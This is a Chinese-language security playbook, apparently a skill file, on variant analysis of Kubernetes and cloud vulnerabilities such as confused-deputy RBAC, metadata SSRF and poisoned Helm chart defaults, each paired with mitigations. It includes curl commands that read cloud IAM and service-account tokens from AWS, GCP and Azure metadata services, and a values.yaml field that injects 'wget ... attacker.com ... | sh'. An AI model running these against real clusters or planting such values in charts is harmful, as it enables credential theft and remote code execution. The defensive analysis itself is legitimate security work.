---
description: 基础设施漏洞的变体分析：跨命名空间、跨 Controller、跨云厂商与共享 Helm Chart 场景。
tags: [infra, kubernetes, variant-analysis, multi-tenant, cloud]
---

# 变体分析 (Variant Analyzer)

## 1. 专家直觉触发器 (Triggers)

当专家确认一个基础设施漏洞后，会立即思考以下变体场景：

- **跨命名空间**：同一漏洞是否在 `kube-system`、`ingress-nginx`、`monitoring` 等特权命名空间同样成立？
- **跨 Controller**：是否只有某个特定 Operator 受影响，还是所有基于 `client-go` Informer 的 Controller 都存在相同的 reconcile 注入模式？
- **跨云厂商**：利用云元数据 SSRF 时，AWS 的 `169.254.169.254`、GCP 的 `metadata.google.internal`、Azure 的 `169.254.169.254/metadata/instance/compute` 是否都能访问？
- **共享 Helm Chart**：该 Chart 是否被大量组织使用？漏洞是否存在于 `values.yaml` 的默认配置中？
- **跨资源类型**：通过 `Pod` 可以逃逸，通过 `DaemonSet`、`StatefulSet`、`Job` 是否同样可行？某些 CRD 是否允许更隐蔽的等价操作？

这些触发器决定了漏洞的复用价值和真实攻击面广度。

## 2. 不可跳过的问题链 (Question Chain)

在变体分析前，必须回答：

1. **漏洞的根因是代码缺陷还是配置缺陷？**  
   如果是代码缺陷，则所有运行该代码的版本和分支都受影响；如果是配置缺陷，则只影响采用该配置模板的用户。
2. **权限模型的差异是否影响利用路径？**  
   在多租户集群中，Namespace A 的用户是否能通过创建 `ResourceQuota` 或 `LimitRange` 影响 Namespace B？
3. **不同云厂商的元数据服务差异？**  
   AWS IMDSv2 需要 PUT 令牌，GCP 需要 `Metadata-Flavor: Google` 头。目标集群是否使用了这些防御措施？
4. **Controller 的输入源是否一致？**  
   不同 Controller 是否都读取 annotation？是否都使用 `ownerReferences`？是否都调用外部二进制文件？
5. **共享组件的版本覆盖范围？**  
   受影响的 Helm Chart 或 Terraform Module 的最新版本是否已修复？历史版本有多少下载量？
6. **是否存在组合型变体？**  
   单独看 A 漏洞无害，单独看 B 漏洞也无害，但 A+B 是否会产生新的高危路径？

## 3. 攻击链闭合 (Attack Chain Closure)

变体分析必须证明漏洞在不同上下文中的可复制性。以下是“RBAC Confused Deputy”的跨命名空间变体：

**基础漏洞**：某 Controller 的 ServiceAccount 拥有 `create pods` 权限，且会读取用户资源中的 `spec.targetNamespace` 字段来决定 Pod 创建位置。

**变体 1（跨命名空间）**：攻击者在 `dev` 命名空间拥有 `create` 权限（针对该 CRD），但无法直接创建 Pod。通过创建 CR 并设置 `spec.targetNamespace: kube-system`，诱使 Controller 在 `kube-system` 创建特权 Pod。由于 Controller 的 ServiceAccount 拥有跨命名空间创建 Pod 的能力，攻击者实现了权限提升。

**变体 2（跨 Controller）**：另一个 Controller（如 CI Runner Operator）同样读取用户资源中的字段并创建 Pod，但其代码路径未对 `securityContext` 做校验。因此同样的输入在不同 Controller 中都能触发逃逸。

**变体 3（跨云）**：逃逸到节点后，AWS 环境可通过 `169.254.169.254` 获取 IAM 凭证；GCP 环境需要访问 `metadata.google.internal`；Azure 需要访问 `169.254.169.254/metadata/identity/oauth2/token`。若节点配置了 Workload Identity，则还可能获取 Pod 级别的云服务凭证，而非仅节点凭证。

**变体 4（共享 Chart）**：受漏洞影响的 Helm Chart 被 10,000 个集群使用。攻击者向公共仓库提交了一个看似无害的 PR，修改了 `values.yaml` 的默认值，加入恶意镜像。由于大量用户直接使用默认 `values`，漏洞瞬间大规模扩散。

**逻辑闭环**：如果漏洞的根因是“用户输入被信任并传递给高权限操作”，那么任何存在相同信任边界的上下文都是有效的变体。因此，**信任边界重复 = 变体必然存在**。

## 4. 代码示例 (Code Examples)

### 4.1 跨命名空间 Confused Deputy（漏洞模式）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: deputy-controller
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: deputy-binding
subjects:
- kind: ServiceAccount
  name: controller
  namespace: system
roleRef:
  kind: ClusterRole
  name: deputy-controller
  apiGroup: rbac.authorization.k8s.io
```

**风险**：Controller 拥有跨命名空间创建 Pod 的能力。若其未校验用户资源中的目标命名空间，则用户可诱骗其在特权命名空间创建恶意 Pod。

### 4.2 安全的 Controller RBAC（缓解模式）

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: controller
  namespace: target-ns
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create"]
```

**缓解**：将 Controller 限制在单一命名空间操作，配合代码中严格校验用户请求的资源 namespace 必须与 Controller 自身 namespace 一致。

### 4.3 跨云元数据访问差异

```bash
# AWS
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

**说明**：变体分析时必须针对不同云厂商准备不同的元数据读取 Payload。

### 4.4 共享 Helm Chart 的恶意默认值（漏洞模式）

```yaml
# values.yaml (受攻击者控制的 PR)
defaultBackend:
  image:
    repository: registry.hub.docker.com/benign-ingress
    tag: v1.2.3
  extraArgs:
    reload: "true; wget -qO- http://attacker.com/beacon | sh"
```

**风险**：若用户直接 `helm install` 而不审查 `values.yaml`，则恶意参数会被注入到 Ingress Controller 的启动参数中。

### 4.5 安全的共享 Chart 模式（缓解模式）

```yaml
# values.yaml
defaultBackend:
  image:
    repository: k8s.gcr.io/defaultbackend-amd64
    tag: "1.4"
  extraArgs: {}
```

**缓解**：不在默认值中启用任何可选功能，对所有字符串参数使用 `quote` 和 `regex` 校验。

## 5. 变体分析自动化工具

为高效扫描变体，建议结合以下工具：

- **kube-score**：对多个命名空间的 YAML 进行批量评分，发现跨命名空间的相同配置错误。
- **checkov**：扫描 Terraform 和 Helm 模板，检测跨模块的 SSRF 与权限提升模式。
- **trivy**：扫描镜像与 Chart 的已知 CVE，快速定位供应链变体风险。
- **kyverno / OPA**：编写策略规则后，自动应用到所有命名空间，验证修复是否彻底。

```bash
# 批量检查所有命名空间的 Pod 安全上下文
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | {ns: .metadata.namespace, pod: .metadata.name}'
```

**说明**：变体分析不应依赖手工逐条检查。通过自动化脚本对所有命名空间、所有 Controller、所有 Chart 实例进行批量扫描，才能确保无遗漏。

### 5.1 变体分析决策树

当发现一个新漏洞时，按以下决策树扩展分析：

1. **漏洞是否依赖特定资源类型？**  
   若是，则检查所有同类 CRD（如 `Pod`, `Deployment`, `DaemonSet`）是否同样受影响。
2. **漏洞是否依赖特定配置字段？**  
   若是，则搜索全集群所有 YAML 中是否存在该字段的变体写法（如 `hostPath` 与 `hostPath + type: DirectoryOrCreate`）。
3. **漏洞是否依赖特定网络位置？**  
   若是，则检查所有节点的网络配置（CNI、VPC 路由）是否同样暴露元数据服务。
4. **漏洞是否依赖特定软件版本？**  
   若是，则扫描所有节点上的 runc、containerd、内核版本，确认是否存在混合版本环境。

**说明**：决策树确保变体分析的系统性和完整性，避免凭直觉遗漏关键场景。
